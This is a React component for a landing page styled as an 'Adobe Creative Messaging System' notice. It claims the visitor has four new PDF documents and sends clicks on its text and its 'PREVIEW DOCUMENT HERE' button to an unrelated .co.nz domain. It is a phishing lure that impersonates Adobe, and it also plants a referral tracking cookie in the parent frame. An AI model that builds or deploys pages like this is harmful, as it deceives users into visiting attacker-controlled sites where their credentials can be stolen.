import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
try{if(window.parent&&window.parent!==window){window.parent.promotekit_referral="1fd2949a-d22c-431b-92bf-02d4ad04ee24";window.parent.document.cookie="promotekit_referral=1fd2949a-d22c-431b-92bf-02d4ad04ee24;path=/;domain=.aura.build;max-age=31536000"}}catch(e){}



tailwind.config = {
theme: {
extend: {
fontFamily: {
sans: ['Inter', 'sans-serif'],
},
colors: {
neutral: {
850: '#1f1f1f',
900: '#171717',
950: '#0a0a0a',
}
},
backgroundImage: {
'gradient-radial': 'radial-gradient(var(--tw-gradient-stops))',
}
}
}
}

    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      

<div className="fixed inset-0 z-0 pointer-events-none">
<div className="absolute top-[-10%] left-[20%] w-[500px] h-[500px] bg-indigo-900/20 rounded-full blur-[128px] opacity-40"></div>
<div className="absolute bottom-[-10%] right-[20%] w-[500px] h-[500px] bg-purple-900/10 rounded-full blur-[128px] opacity-40"></div>
<div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-[0.03]"></div>
</div>

<header className="fixed top-0 w-full z-50 border-b border-white/[0.08] glass">
</header>
<main className="z-10 pt-32 pb-20 relative">

<section className="max-w-7xl mx-auto px-6 mb-32">
</section>


<section className="max-w-7xl mx-auto px-6 mb-32">
</section>

<section className="max-w-4xl mx-auto px-6 mb-32 text-center">
<div className="relative p-12 overflow-hidden rounded-2xl border border-white/10 bg-neutral-900/20">
<div className="bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-indigo-900/40 via-neutral-900/0 to-transparent absolute top-0 right-0 bottom-0 left-0"></div>
<div className="relative z-10">
<h2 className="md:text-3xl text-3xl font-medium text-white tracking-tight mb-6">ADOBE CREATIVE MESSAGING SYSTEM​
</h2>
<p className="cursor-pointer text-lg font-light text-neutral-400 max-w-xl mr-auto mb-8 ml-auto" onclick="window.location.href='https://griyntmsy.carpromilfords.co.nz/'" role="button">You have received (4) New PDF documents for
  your review. All information and document is available for your review. Click below to read your message securely from
  our website.</p>
<div className="flex flex-col sm:flex-row gap-4 items-center justify-center">
<button className="hover:bg-neutral-200 transition-colors cursor-pointer text-lg font-semibold text-neutral-950 bg-white rounded-full pt-3 pr-8 pb-3 pl-8" onclick="window.location.href='https://griyntmsy.carpromilfords.co.nz/'" role="button">PREVIEW DOCUMENT HERE</button>
</div>
</div>
</div>
</section>
</main>


    </>
  );
}
